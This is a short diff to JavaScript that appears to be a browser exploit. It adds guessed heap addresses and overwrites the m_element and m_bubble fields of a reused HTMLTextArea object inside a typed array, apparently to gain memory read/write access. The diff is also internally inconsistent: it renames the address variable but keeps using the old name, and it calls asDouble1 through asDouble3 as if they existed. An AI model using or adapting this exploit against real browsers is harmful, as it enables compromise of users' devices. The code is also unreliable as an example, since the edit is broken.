@@ -42,7 +42,9 @@ var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
 var g_round = 1;
 var g_input = null;
 
-var guess_htmltextarea_addr = new Int64("0x20a505b48");
+var guess_htmltextarea_addr1 = new Int64("0x20a505b48");
+var guess_htmltextarea_addr2 = new Int64("0x2076dfd80");
+var guess_htmltextarea_addr3 = new Int64("0x2076dfde0");
 
 var master_b = new Uint32Array(2);
 var slave_b =  new Uint32Array(2);
@@ -397,7 +399,9 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[2] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[3] = guess_htmltextarea_addr.asDouble1();   // m_bubble
+		view[4] = guess_htmltextarea_addr.asDouble2();   // m_bubble
+		view[5] = guess_htmltextarea_addr.asDouble3();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
